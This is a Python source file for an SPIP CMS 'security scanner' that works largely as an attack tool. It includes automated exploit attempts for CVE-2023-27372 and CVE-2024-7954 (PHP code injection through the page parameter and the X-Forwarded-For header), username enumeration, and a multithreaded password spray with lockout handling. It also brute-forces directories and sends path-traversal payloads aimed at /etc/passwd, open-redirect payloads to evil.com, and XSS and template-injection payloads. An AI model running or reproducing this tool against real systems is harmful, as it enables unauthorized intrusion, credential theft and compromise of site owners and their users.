#!/usr/bin/env python3

import requests
import argparse
import json
import re
import sys
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urljoin, quote

requests.packages.urllib3.disable_warnings()

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"

BANNER = rf"""
{RED}
 ██████   ██████  ████████ ███████ ██████   ██ ██████  ██████  
██       ██  ████    ██    ██      ██   ██ ███ ██   ██      ██ 
██   ███ ██ ██ ██    ██    ███████ ██████   ██ ██████    ▄███  
██    ██ ████  ██    ██         ██ ██       ██ ██        ▀▀    
 ██████   ██████     ██    ███████ ██       ██ ██        ██    
                                                                      
                                                      
{RESET}
        {CYAN}SPIP CMS Security Scanner{RESET}
        {BLUE}Author: c0d3Ninja{RESET}
        {BLUE}Github: https://github.com/gotr00t0day{RESET}
"""

DEFAULT_USERNAMES = [
    "admin", "administrator", "root", "webmaster", "editor", "author",
    "test", "dev", "user", "guest", "moderator", "manager", "support",
    "info", "contact", "web", "api", "service", "backup", "system",
    "operator", "demo", "staging", "spip"
]

SPIP_ENDPOINTS = [
    "/ecrire/",
    "/spip.php?page=login",
    "/spip.php?page=spip_pass",
    "/spip.php?page=backend",
    "/spip.php?page=contact",
    "/spip.php?page=recherche",
    "/spip.php?action=converser",
    "/spip.php?action=cron",
    "/spip.php?action=bigup",
    "/spip.php?action=infospassword",
    "/spip.php?var_mode=debug",
    "/spip.php?var_mode=preview",
    "/spip.php?var_mode=recalcul",
    "/config/connect.php",
    "/config/ecran_securite.php",
    "/tmp/log/spip.log",
    "/tmp/log/mysql.log",
    "/tmp/dump/",
    "/local/",
    "/CHANGELOG.txt",
    "/core/CHANGELOG.txt",
    "/jsonapi/",
    "/openapi.yaml",
    "/swagger.json",
    "/v1/specification.yaml",
    "/robots.txt",
    "/crossdomain.xml",
]

DIR_WORDLIST = [
    "admin", "backup", "backups", "bak", "cache", "cgi-bin", "config",
    "data", "database", "db", "debug", "dev", "docs", "dump", "env",
    "export", "files", "hidden", "img", "images", "import", "include",
    "includes", "internal", "lib", "libs", "log", "logs", "media",
    "modules", "old", "panel", "phpmyadmin", "private", "public",
    "scripts", "secret", "server-info", "server-status", "sql",
    "staging", "static", "stats", "storage", "system", "temp", "test",
    "tmp", "upload", "uploads", "users", "var", "vendor", "wp-admin",
    "wp-content", ".env", ".git", ".git/HEAD", ".htaccess", ".svn",
    ".DS_Store", "web.config", "sitemap.xml", "composer.json",
    "package.json", ".well-known/", "api/", "rest/", "graphql",
]

SPIP_PLUGINS = [
    "plugins/auto/", "plugins/", "plugins-dist/",
    "plugins-dist/mediabox/", "plugins-dist/porte_plume/",
    "plugins-dist/textwheel/", "plugins-dist/archiviste/",
    "plugins-dist/breves/", "plugins-dist/compresseur/",
    "plugins-dist/dump/", "plugins-dist/filtres_images/",
    "plugins-dist/forum/", "plugins-dist/jquery_ui/",
    "plugins-dist/mots/", "plugins-dist/msie_compat/",
    "plugins-dist/organiseur/", "plugins-dist/petitions/",
    "plugins-dist/plan/", "plugins-dist/revisions/",
    "plugins-dist/safehtml/", "plugins-dist/sites/",
    "plugins-dist/squelettes_par_rubrique/", "plugins-dist/stats/",
    "plugins-dist/svp/", "plugins-dist/urls_etendues/",
    "plugins-dist/vertebres/",
]

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<svg/onload=alert(1)>',
    '{{7*191}}',
    '[(#VAL{191}|mult{7})]',
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "....//....//....//etc/passwd",
    "../../../etc/passwd%00",
    "../config/connect.php",
    "../tmp/log/spip.log",
    "/../../../etc/hosts",
    "..\\..\\..\\etc\\passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "\\evil.com",
    "https://evil.com#",
    "//evil.com/%2f..",
    "https://target.com@evil.com",
    "/\\evil.com",
    "https:%0a//evil.com",
    "/%09/evil.com",
    "https://evil.com?",
]

WAF_SIGNATURES = {
    "Cloudflare": ["cf-ray", "cloudflare", "__cfduid", "cf-cache-status"],
    "AWS WAF": ["x-amzn-requestid", "x-amz-cf-id"],
    "Akamai": ["akamai", "x-akamai"],
    "Sucuri": ["x-sucuri-id", "sucuri", "x-sucuri-cache"],
    "ModSecurity": ["mod_security", "modsecurity"],
    "Imperva/Incapsula": ["incap_ses", "visid_incap", "x-iinfo"],
    "F5 BIG-IP": ["x-wa-info", "bigipserver"],
    "Barracuda": ["barra_counter_session"],
    "Wordfence": ["wordfence"],
    "AWS CloudFront": ["x-amz-cf-pop", "x-amz-cf-id"],
}


class SpipScanner:
    def __init__(self, target, threads=10, timeout=10, delay=0.5, verbose=False):
        self.target = target.rstrip("/")
        self.threads = threads
        self.timeout = timeout
        self.delay = delay
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0"
        })
        self.findings = []
        self.valid_users = []
        self.version = None
        self.waf_detected = None
        self.lockout_triggered = False
        self.composer_data = None
        self._composer_report = None

    def log(self, level, msg):
        timestamp = datetime.now().strftime("%H:%M:%S")
        prefix = {
            "info": f"{BLUE}[*]",
            "success": f"{GREEN}[+]",
            "warning": f"{YELLOW}[!]",
            "error": f"{RED}[-]",
            "critical": f"{RED}{BOLD}[!!!]",
            "debug": f"{CYAN}[~]",
        }.get(level, f"{BLUE}[*]")
        print(f"{prefix} [{timestamp}] {msg}{RESET}")

    def add_finding(self, title, severity, details):
        self.findings.append({
            "title": title,
            "severity": severity,
            "details": details,
            "timestamp": datetime.now().isoformat()
        })

    # ── WAF Detection ──────────────────────────────────────────────

    def detect_waf(self):
        self.log("info", "Detecting WAF/CDN...")
        try:
            normal_r = self.session.get(self.target, timeout=self.timeout)
            headers_lower = {k.lower(): v.lower() for k, v in normal_r.headers.items()}
            cookies = {c.name.lower(): c.value for c in self.session.cookies}

            for waf_name, signatures in WAF_SIGNATURES.items():
                for sig in signatures:
                    sig_l = sig.lower()
                    if any(sig_l in h for h in headers_lower.keys()):
                        self.waf_detected = waf_name
                        self.log("warning", f"WAF Detected: {waf_name} (header match: {sig})")
                        self.add_finding("WAF/CDN Detected", "Info", f"{waf_name} detected via header: {sig}")
                        return waf_name
                    if any(sig_l in v for v in headers_lower.values()):
                        self.waf_detected = waf_name
                        self.log("warning", f"WAF Detected: {waf_name} (header value match: {sig})")
                        self.add_finding("WAF/CDN Detected", "Info", f"{waf_name} detected via header value: {sig}")
                        return waf_name
                    if any(sig_l in c for c in cookies.keys()):
                        self.waf_detected = waf_name
                        self.log("warning", f"WAF Detected: {waf_name} (cookie match: {sig})")
                        self.add_finding("WAF/CDN Detected", "Info", f"{waf_name} detected via cookie: {sig}")
                        return waf_name

            malicious_r = self.session.get(
                f"{self.target}/?id=1' OR 1=1--&<script>alert(1)</script>",
                timeout=self.timeout
            )
            if malicious_r.status_code in (403, 406, 429, 503):
                self.waf_detected = "Unknown WAF"
                self.log("warning", f"WAF Detected: Unknown (blocked malicious request with {malicious_r.status_code})")
                self.add_finding("WAF/CDN Detected", "Info", f"Unknown WAF blocked request (HTTP {malicious_r.status_code})")
                return "Unknown"

            self.log("info", "No WAF detected")
        except Exception as e:
            if self.verbose:
                self.log("error", f"WAF detection error: {e}")
        return None

    # ── Version Detection ──────────────────────────────────────────

    def detect_version(self):
        self.log("info", "Detecting SPIP version...")
        try:
            r = self.session.get(self.target, timeout=self.timeout)
            match = re.search(r'content="SPIP\s+([\d.]+)"', r.text)
            if match:
                self.version = match.group(1)
                self.log("success", f"SPIP Version: {self.version}")
                self.add_finding("SPIP Version Disclosure", "Low", f"Version {self.version} via meta generator tag")
                self._check_version_cves()
                return self.version

            for header in ["X-Spip-Cache", "Composed-By"]:
                if header in r.headers:
                    self.log("success", f"SPIP Header: {header}: {r.headers[header]}")
                    return r.headers[header]

            if "spip.php" in r.text or "SPIP" in r.text:
                self.log("warning", "SPIP detected but version not found in meta tag")
                return "unknown"

        except Exception as e:
            self.log("error", f"Version detection failed: {e}")
        return None

    def _check_version_cves(self):
        if not self.version:
            return
        v = tuple(int(x) for x in self.version.split("."))

        cves = []
        if v < (3, 2, 18) or (v >= (4, 0, 0) and v < (4, 1, 8)) or (v >= (4, 2, 0) and v < (4, 2, 1)):
            cves.append(("CVE-2023-27372", "Critical", "RCE via page parameter"))
        if v < (4, 3, 2):
            cves.append(("CVE-2024-7954", "Critical", "PHP Code Execution"))
        if v < (4, 3, 5):
            cves.append(("CVE-2024-8517", "High", "RCE via BigUp plugin"))

        for cve_id, severity, desc in cves:
            self.log("critical", f"VULNERABLE to {cve_id}: {desc} ({severity})")
            self.add_finding(f"Vulnerable: {cve_id}", severity, desc)

        if not cves:
            self.log("info", f"No critical CVEs found for SPIP {self.version}")

    # ── CVE Auto-Exploit ───────────────────────────────────────────

    def exploit_cves(self):
        if not self.version:
            self.detect_version()
        if not self.version:
            self.log("error", "Cannot exploit without version info")
            return []

        v = tuple(int(x) for x in self.version.split("."))
        results = []

        if v < (3, 2, 18) or (v >= (4, 0, 0) and v < (4, 1, 8)) or (v >= (4, 2, 0) and v < (4, 2, 1)):
            self.log("info", "Testing CVE-2023-27372 (RCE via page parameter)...")
            result = self._exploit_cve_2023_27372()
            if result:
                results.append(result)

        if v < (4, 3, 2):
            self.log("info", "Testing CVE-2024-7954 (PHP Code Execution)...")
            result = self._exploit_cve_2024_7954()
            if result:
                results.append(result)

        if v < (4, 3, 5):
            self.log("info", "Testing CVE-2024-8517 (BigUp RCE)...")
            result = self._exploit_cve_2024_8517()
            if result:
                results.append(result)

        if not results:
            self.log("info", "No exploitable CVEs confirmed")
        return results

    def _exploit_cve_2023_27372(self):
        canary = ''.join(random.choices(string.ascii_lowercase, k=8))
        payloads = [
            f"s]?>{{$_GET['c']}}<?//",
            f"s%]?>{{$_GET['c']}}<?//",
        ]
        for payload in payloads:
            try:
                url = f"{self.target}/spip.php?page=contact"
                r = self.session.post(url, data={
                    "page": f"contact{payload}",
                    "nom": "test",
                    "mail": "test@test.com",
                    "sujet": "test",
                    "texte": "test"
                }, timeout=self.timeout)

                verify_url = f"{self.target}/spip.php?page=contact&c=echo+{canary}"
                r2 = self.session.get(verify_url, timeout=self.timeout)
                if canary in r2.text:
                    self.log("critical", "CVE-2023-27372: RCE CONFIRMED!")
                    self.add_finding("CVE-2023-27372 RCE Confirmed", "Critical", "Remote code execution via page parameter injection")
                    return {"cve": "CVE-2023-27372", "status": "exploitable"}
            except Exception:
                pass

        self.log("info", "CVE-2023-27372: Not exploitable or patched")
        return None

    def _exploit_cve_2024_7954(self):
        canary = ''.join(random.choices(string.ascii_lowercase, k=8))
        endpoints = [
            f"/spip.php?page=contact&arg=1",
            f"/spip.php?page=login",
        ]
        for endpoint in endpoints:
            try:
                url = f"{self.target}{endpoint}"
                r = self.session.get(url, headers={
                    "X-Forwarded-For": f"<?php echo '{canary}'; ?>"
                }, timeout=self.timeout)
                if canary in r.text:
                    self.log("critical", "CVE-2024-7954: PHP Code Execution CONFIRMED!")
                    self.add_finding("CVE-2024-7954 Code Exec Confirmed", "Critical", "PHP code execution via header injection")
                    return {"cve": "CVE-2024-7954", "status": "exploitable"}
            except Exception:
                pass

        self.log("info", "CVE-2024-7954: Not exploitable or patched")
        return None

    def _exploit_cve_2024_8517(self):
        try:
            url = f"{self.target}/spip.php?action=bigup"
            r = self.session.get(url, timeout=self.timeout)
            if r.status_code == 403:
                self.log("warning", "CVE-2024-8517: BigUp endpoint exists (403). May need auth to exploit")
                return {"cve": "CVE-2024-8517", "status": "endpoint_exists"}
            elif r.status_code == 200:
                self.log("warning", "CVE-2024-8517: BigUp endpoint accessible")
                self.add_finding("CVE-2024-8517 BigUp Accessible", "High", "BigUp file upload endpoint accessible")
                return {"cve": "CVE-2024-8517", "status": "accessible"}
        except Exception:
            pass

        self.log("info", "CVE-2024-8517: BigUp endpoint not found")
        return None

    # ── User Enumeration ───────────────────────────────────────────

    def _check_single_user(self, username):
        try:
            url = f"{self.target}/spip.php?page=informer_auteur&var_login={username}"
            r = self.session.get(url, timeout=self.timeout)
            data = r.json()
            cnx = data.get("cnx", "0")
            logo = data.get("logo", "")

            if cnx == "1":
                self.log("success", f"VALID USER (active): {username}")
                return {"username": username, "status": "active", "logo": bool(logo)}
            elif logo:
                self.log("success", f"VALID USER (has logo): {username}")
                return {"username": username, "status": "has_logo", "logo": True}

            if self.verbose:
                self.log("debug", f"Invalid: {username}")

        except json.JSONDecodeError:
            self.log("warning", f"Non-JSON response for: {username}")
            return {"username": username, "status": "interesting", "logo": False}
        except Exception as e:
            if self.verbose:
                self.log("error", f"Error checking {username}: {e}")
        return None

    def enumerate_users(self, userlist=None):
        usernames = userlist or DEFAULT_USERNAMES
        self.log("info", f"Enumerating {len(usernames)} usernames via informer_auteur...")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self._check_single_user, u): u for u in usernames}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.valid_users.append(result)
                time.sleep(self.delay)

        if self.valid_users:
            self.log("success", f"Found {len(self.valid_users)} valid user(s)")
            self.add_finding(
                "User Enumeration via informer_auteur",
                "Medium",
                f"Valid users: {', '.join(u['username'] for u in self.valid_users)}"
            )
        else:
            self.log("warning", "No valid users found")
        return self.valid_users

    # ── Password Spray with Lockout Detection ──────────────────────

    def _try_login(self, username, password):
        try:
            url = f"{self.target}/spip.php?page=login"
            data = {"var_login": username, "password": password}
            r = self.session.post(url, data=data, timeout=self.timeout, allow_redirects=False)

            if r.status_code == 429:
                return "rate_limited"

            lockout_indicators = ["blocked", "locked", "too many", "try again later", "flood"]
            if any(ind in r.text.lower() for ind in lockout_indicators):
                return "locked_out"

            if r.status_code in (301, 302, 303):
                location = r.headers.get("Location", "")
                if "ecrire" in location or "exec=" in location:
                    return "success"

            if "formulaire_action" not in r.text and r.status_code == 200:
                if "ecrire" in r.text and "exec=" in r.text:
                    return "success"

        except Exception as e:
            if self.verbose:
                self.log("error", f"Login error {username}:{password} - {e}")
        return "failed"

    def password_spray(self, usernames, passwords):
        total = len(usernames) * len(passwords)
        self.log("info", f"Password spraying: {len(usernames)} users x {len(passwords)} passwords = {total} attempts")

        found = []
        count = 0
        lockout_count = 0
        start_time = time.time()
        batch_size = self.threads * 5
        stop = False

        for batch_start in range(0, len(passwords), batch_size):
            if stop:
                break

            batch = passwords[batch_start:batch_start + batch_size]

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {}
                for username in usernames:
                    for password in batch:
                        future = executor.submit(self._try_login, username, password)
                        futures[future] = (username, password)

                for future in as_completed(futures):
                    username, password = futures[future]
                    count += 1
                    result = future.result()

                    if result == "success":
                        print()
                        self.log("critical", f"CREDENTIALS FOUND: {username}:{password}")
                        found.append((username, password))
                        self.add_finding("Valid Credentials Found", "Critical", f"{username}:{password}")
                        stop = True
                        break
                    elif result == "rate_limited":
                        print()
                        self.log("warning", "Rate limited (429). Sleeping 30s...")
                        time.sleep(30)
                    elif result == "locked_out":
                        lockout_count += 1
                        if lockout_count >= 3:
                            print()
                            self.log("error", "Account lockout detected! Stopping spray")
                            self.lockout_triggered = True
                            self.add_finding("Account Lockout Triggered", "Info", f"Lockout after {count} attempts")
                            stop = True
                            break
                        else:
                            print()
                            self.log("warning", f"Possible lockout detected ({lockout_count}/3). Sleeping 60s...")
                            time.sleep(60)
                    else:
                        elapsed = time.time() - start_time
                        rate = count / elapsed if elapsed > 0 else 0
                        pct = (count / total) * 100
                        eta = (total - count) / rate if rate > 0 else 0
                        eta_str = time.strftime("%H:%M:%S", time.gmtime(eta))
                        print(f"\r{BLUE}[*] Progress: {count}/{total} ({pct:.1f}%) | {rate:.1f} req/s | ETA: {eta_str} | Last: {password}{RESET}    ", end="", flush=True)
                        if self.verbose:
                            self.log("debug", f"\n[{count}/{total}] Failed: {username}:{password}")

        elapsed = time.time() - start_time
        print()
        self.log("info", f"Spray complete: {count} attempts in {time.strftime('%H:%M:%S', time.gmtime(elapsed))}")

        if not found:
            self.log("warning", "No valid credentials found")
        return found

    # ── Endpoint Discovery ─────────────────────────────────────────

    def _check_endpoint(self, path):
        try:
            url = urljoin(self.target + "/", path.lstrip("/"))
            r = self.session.get(url, timeout=self.timeout, allow_redirects=False)
            status = r.status_code
            length = len(r.content)

            if status == 200 and length > 0:
                details = ""
                if "crossdomain.xml" in path and 'domain="*"' in r.text:
                    details = "Wildcard cross-domain policy (allow-access-from domain=*)"
                elif "CHANGELOG" in path:
                    details = "Changelog accessible"
                elif "connect.php" in path and "<?php" not in r.text:
                    details = "Database config potentially exposed"
                elif "log" in path and ("error" in r.text.lower() or "sql" in r.text.lower()):
                    details = "Log file with sensitive data"
                elif "dump" in path:
                    details = "Database dump directory accessible"
                elif "debug" in path and "var_mode" in path:
                    details = "Debug mode accessible"
                elif "ecrire" in path:
                    details = "Admin panel accessible"
                elif "backend" in path and ("xml" in r.headers.get("Content-Type", "") or "<rss" in r.text):
                    details = "RSS backend feed accessible"
                else:
                    details = f"Accessible ({length} bytes)"

                self.log("success", f"{status} {path} - {details}")
                return {"path": path, "status": status, "length": length, "details": details}

            elif status == 403:
                self.log("warning", f"{status} {path} - Forbidden (exists but restricted)")
                return {"path": path, "status": status, "length": length, "details": "Forbidden"}

            elif self.verbose:
                self.log("debug", f"{status} {path}")

        except Exception as e:
            if self.verbose:
                self.log("error", f"Error checking {path}: {e}")
        return None

    def discover_endpoints(self, extra_paths=None):
        paths = SPIP_ENDPOINTS + (extra_paths or [])
        self.log("info", f"Discovering {len(paths)} endpoints...")
        results = []

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self._check_endpoint, p): p for p in paths}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)

        if results:
            self.add_finding("Accessible Endpoints Discovered", "Medium", f"{len(results)} endpoints found")
        return results

    # ── Directory Bruteforce ───────────────────────────────────────

    def _bruteforce_dir(self, path):
        try:
            url = f"{self.target}/{path}"
            r = self.session.get(url, timeout=self.timeout, allow_redirects=False)
            status = r.status_code
            length = len(r.content)

            if status in (200, 301, 302) and length > 0:
                if status in (301, 302):
                    location = r.headers.get("Location", "")
                    self.log("success", f"{status} /{path} -> {location}")
                else:
                    self.log("success", f"{status} /{path} ({length} bytes)")
                return {"path": path, "status": status, "length": length}
            elif status == 403:
                self.log("warning", f"403 /{path} (forbidden)")
                return {"path": path, "status": 403, "length": length}
        except Exception:
            pass
        return None

    def bruteforce_dirs(self, wordlist=None):
        dirs = wordlist or DIR_WORDLIST
        self.log("info", f"Bruteforcing {len(dirs)} directories...")
        results = []

        baseline = self.session.get(f"{self.target}/{''.join(random.choices(string.ascii_lowercase, k=16))}", timeout=self.timeout)
        baseline_size = len(baseline.content)
        baseline_status = baseline.status_code

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self._bruteforce_dir, d): d for d in dirs}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    if result["status"] == 200 and abs(result["length"] - baseline_size) < 50 and baseline_status == 200:
                        continue
                    results.append(result)

        if results:
            found_paths = [r["path"] for r in results if r["status"] in (200, 301, 302)]
            if found_paths:
                self.add_finding("Hidden Directories Found", "Medium", f"Found: {', '.join(found_paths[:10])}")
        return results

    # ── HTTP Methods ───────────────────────────────────────────────

    def check_http_methods(self):
        self.log("info", "Checking HTTP methods...")
        methods = ["TRACE", "OPTIONS", "HEAD"]
        allowed = ["GET", "POST"]

        baseline_r = self.session.get(self.target, timeout=self.timeout)
        baseline_body = baseline_r.text

        for method in methods:
            try:
                r = self.session.request(method, self.target, timeout=self.timeout)

                if method == "TRACE":
                    if r.status_code == 200 and "message/http" in r.headers.get("Content-Type", ""):
                        allowed.append(method)
                        self.log("critical", "TRACE method enabled - XST possible!")
                        self.add_finding("HTTP TRACE Method Enabled (XST)", "Medium", "TRACE reflects headers including cookies")
                    elif self.verbose:
                        self.log("debug", f"TRACE not enabled (status={r.status_code})")

                elif method == "OPTIONS":
                    allow_header = r.headers.get("Allow", "")
                    if allow_header:
                        allowed.append(method)
                        self.log("info", f"OPTIONS Allow header: {allow_header}")
                        dangerous = [m.strip() for m in allow_header.split(",") if m.strip() in ("PUT", "DELETE", "PATCH")]
                        for dm in dangerous:
                            self.log("warning", f"Dangerous method in Allow header: {dm}")
                            self.add_finding(f"Dangerous HTTP Method: {dm}", "Medium", f"Server Allow header includes {dm}")
                    elif self.verbose:
                        self.log("debug", "OPTIONS returned no Allow header")

                elif method == "HEAD":
                    if r.status_code < 405:
                        allowed.append(method)

            except Exception:
                pass

        for method in ["PUT", "DELETE", "PATCH"]:
            try:
                r = self.session.request(method, self.target, timeout=self.timeout)
                if r.status_code == 405:
                    if self.verbose:
                        self.log("debug", f"{method} properly rejected (405)")
                elif r.status_code < 400 and r.text != baseline_body:
                    allowed.append(method)
                    self.log("warning", f"Dangerous method allowed: {method} (different response)")
                    self.add_finding(f"Dangerous HTTP Method: {method}", "Medium", f"{method} returns different response than GET")
                elif self.verbose:
                    self.log("debug", f"{method} returns same page as GET (not truly supported)")
            except Exception:
                pass

        override_headers = ["X-HTTP-Method", "X-HTTP-Method-Override", "X-Method-Override"]
        baseline_post = self.session.post(self.target, timeout=self.timeout)
        baseline_post_body = baseline_post.text

        for header in override_headers:
            for override_method in ["PUT", "DELETE", "PATCH"]:
                try:
                    r = self.session.post(self.target, headers={header: override_method}, timeout=self.timeout)
                    if r.text != baseline_post_body:
                        self.log("warning", f"Method override works: {header}: {override_method}")
                        self.add_finding("HTTP Method Override", "Medium", f"{header}: {override_method} produces different response")
                    elif self.verbose:
                        self.log("debug", f"Override {header}: {override_method} - same response (false positive)")
                except Exception:
                    pass

        self.log("info", f"Allowed methods: {', '.join(allowed)}")
        return allowed

    # ── Path Traversal ─────────────────────────────────────────────

    def test_path_traversal(self):
        self.log("info", "Testing for Path Traversal...")
        results = []

        targets = [
            ("/spip.php?action=converser&redirect={payload}", "redirect"),
            ("/spip.php?page={payload}", "page"),
            ("/spip.php?page=login&url={payload}", "url"),
        ]

        for template, param in targets:
            for payload in PATH_TRAVERSAL_PAYLOADS:
                try:
                    url = f"{self.target}{template.format(payload=quote(payload, safe=''))}"
                    r = self.session.get(url, timeout=self.timeout, allow_redirects=False)

                    lfi_indicators = ["root:", "daemon:", "[boot loader]", "[fonts]", "localhost"]
                    if any(ind in r.text for ind in lfi_indicators):
                        self.log("critical", f"PATH TRAVERSAL CONFIRMED: {param}={payload}")
                        results.append({"param": param, "payload": payload, "evidence": "file content leaked"})
                        self.add_finding(
                            "Path Traversal (LFI)",
                            "Critical",
                            f"Param: {param}, Payload: {payload}"
                        )
                        break

                    if r.status_code in (301, 302):
                        location = r.headers.get("Location", "")
                        if ".." in location or "etc/passwd" in location:
                            self.log("warning", f"Path traversal in redirect: {param}={payload} -> {location}")
                            results.append({"param": param, "payload": payload, "evidence": f"redirect to {location}"})

                except Exception:
                    pass

        if not results:
            self.log("info", "No path traversal found")
        return results

    # ── Open Redirect ──────────────────────────────────────────────

    def _is_external_redirect(self, location, target_host):
        from urllib.parse import urlparse
        if not location:
            return False
        try:
            parsed = urlparse(location)
            loc_host = parsed.hostname or ""
            if not loc_host:
                if location.startswith("//"):
                    loc_host = location.split("//")[1].split("/")[0].split("?")[0]
                else:
                    return False
            return loc_host and target_host not in loc_host and loc_host not in target_host
        except Exception:
            return False

    def test_open_redirect(self):
        self.log("info", "Testing for Open Redirect...")
        results = []

        from urllib.parse import urlparse
        target_host = urlparse(self.target).hostname or ""

        targets = [
            ("/spip.php?action=converser&redirect={payload}", "redirect"),
            ("/spip.php?page=login&url={payload}", "url"),
        ]

        for template, param in targets:
            for payload in OPEN_REDIRECT_PAYLOADS:
                try:
                    url = f"{self.target}{template.format(payload=quote(payload, safe=''))}"
                    r = self.session.get(url, timeout=self.timeout, allow_redirects=False)

                    if r.status_code in (301, 302, 303, 307, 308):
                        location = r.headers.get("Location", "")
                        if self._is_external_redirect(location, target_host):
                            self.log("critical", f"OPEN REDIRECT: {param}={payload} -> {location}")
                            results.append({"param": param, "payload": payload, "location": location})
                            self.add_finding("Open Redirect", "Medium", f"Param: {param}, Payload: {payload} -> {location}")
                            break
                        elif self.verbose:
                            self.log("debug", f"Redirect stays on target: {location}")

                    if r.status_code == 200:
                        meta_match = re.search(r'http-equiv="refresh".*?url=([^"\'>\s]+)', r.text, re.I)
                        if meta_match:
                            meta_url = meta_match.group(1)
                            if self._is_external_redirect(meta_url, target_host):
                                self.log("critical", f"OPEN REDIRECT (meta): {param}={payload} -> {meta_url}")
                                results.append({"param": param, "payload": payload, "location": meta_url})
                                self.add_finding("Open Redirect (Meta Refresh)", "Medium", f"Param: {param} -> {meta_url}")
                                break
                            elif self.verbose:
                                self.log("debug", f"Meta redirect stays on target: {meta_url}")

                except Exception:
                    pass

        if not results:
            self.log("info", "No open redirect found")
        return results

    # ── XSS Testing ────────────────────────────────────────────────

    def _test_xss_point(self, param_name, payload, endpoint):
        try:
            url = f"{self.target}{endpoint}"

            baseline_data = {param_name: "BASELINE_SAFE_VALUE"}
            baseline_r = self.session.post(url, data=baseline_data, timeout=self.timeout)

            data = {param_name: payload}
            r = self.session.post(url, data=data, timeout=self.timeout)

            html_dangerous = ["<script", "<img", "<svg", "onerror=", "onload=", "javascript:"]
            is_html_payload = any(tag in payload.lower() for tag in html_dangerous)

            if is_html_payload and payload in r.text:
                encoded_version = payload.replace("<", "&lt;").replace(">", "&gt;")
                if encoded_version not in r.text:
                    return {"endpoint": endpoint, "param": param_name, "payload": payload, "reflected": True}

            ssti_checks = {
                "{{7*191}}": "1337",
                "[(#VAL{191}|mult{7})]": "1337",
            }
            if payload in ssti_checks:
                expected = ssti_checks[payload]
                if expected in r.text and expected not in baseline_r.text:
                    return {"endpoint": endpoint, "param": param_name, "payload": payload, "reflected": "ssti"}

        except Exception:
            pass
        return None

    def test_xss(self):
        self.log("info", "Testing for XSS vulnerabilities...")
        results = []
        targets = [
            ("/spip.php?page=contact", "nom"),
            ("/spip.php?page=contact", "mail"),
            ("/spip.php?page=contact", "sujet"),
            ("/spip.php?page=contact", "texte"),
            ("/spip.php?page=recherche", "recherche"),
            ("/spip.php?page=login", "var_login"),
        ]

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for endpoint, param in targets:
                for payload in XSS_PAYLOADS:
                    future = executor.submit(self._test_xss_point, param, payload, endpoint)
                    futures[future] = (endpoint, param, payload)

            for future in as_completed(futures):
                result = future.result()
                if result:
                    reflected = result["reflected"]
                    status = "REFLECTED" if reflected is True else "SSTI"
                    self.log("critical", f"XSS {status}: {result['endpoint']} [{result['param']}] -> {result['payload']}")
                    results.append(result)
                    self.add_finding(f"XSS ({status})", "High", f"{result['endpoint']} [{result['param']}]: {result['payload']}")

        if not results:
            self.log("info", "No reflected XSS found")
        return results

    # ── SSTI Testing ───────────────────────────────────────────────

    def test_ssti(self):
        self.log("info", "Testing for SPIP Template Injection (SSTI)...")
        ssti_payloads = [
            ("[(#VAL{191}|mult{7})]", "1337"),
            ("{{7*191}}", "1337"),
            ("#EVAL{191*7}", "1337"),
        ]
        results = []

        for endpoint in ["/spip.php?page=contact", "/spip.php?page=recherche"]:
            for payload, expected in ssti_payloads:
                try:
                    url = f"{self.target}{endpoint}"
                    params = {"nom": payload} if "contact" in endpoint else {"recherche": payload}
                    r = self.session.post(url, data=params, timeout=self.timeout)
                    if expected in r.text and payload not in r.text:
                        self.log("critical", f"SSTI CONFIRMED: {endpoint} -> {payload} = {expected}")
                        results.append({"endpoint": endpoint, "payload": payload, "output": expected})
                        self.add_finding("SSTI (Template Injection)", "Critical", f"{endpoint}: {payload} -> {expected}")
                except Exception:
                    pass
        return results

    # ── RSS/Data Leak ──────────────────────────────────────────────

    def check_rss_leak(self):
        self.log("info", "Checking RSS backend for data leaks...")
        try:
            url = f"{self.target}/spip.php?page=backend"
            r = self.session.get(url, timeout=self.timeout)

            if r.status_code != 200 or "<rss" not in r.text.lower():
                self.log("info", "RSS feed not accessible")
                return None

            emails = set(re.findall(r'[\w.+-]+@[\w-]+\.[\w.]+', r.text))
            paths = set(re.findall(r'(?:href|src)=["\']([^"\']+)["\']', r.text))
            titles = re.findall(r'<title>([^<]+)</title>', r.text)
            authors = set(re.findall(r'<dc:creator>([^<]+)</dc:creator>', r.text))
            internal_urls = [p for p in paths if "127.0.0.1" in p or "localhost" in p or "192.168" in p or "10." in p]

            leaks = []
            if emails:
                leaks.append(f"Emails: {', '.join(emails)}")
                self.log("success", f"RSS leak - Emails: {', '.join(emails)}")
            if authors:
                leaks.append(f"Authors: {', '.join(authors)}")
                self.log("success", f"RSS leak - Authors: {', '.join(authors)}")
            if internal_urls:
                leaks.append(f"Internal URLs: {', '.join(internal_urls)}")
                self.log("warning", f"RSS leak - Internal URLs exposed")

            if leaks:
                self.add_finding("Data Leak via RSS Feed", "Medium", "; ".join(leaks))
                return {"emails": list(emails), "authors": list(authors), "internal_urls": internal_urls}

            self.log("info", "RSS feed accessible but no sensitive data found")

        except Exception as e:
            if self.verbose:
                self.log("error", f"RSS check error: {e}")
        return None

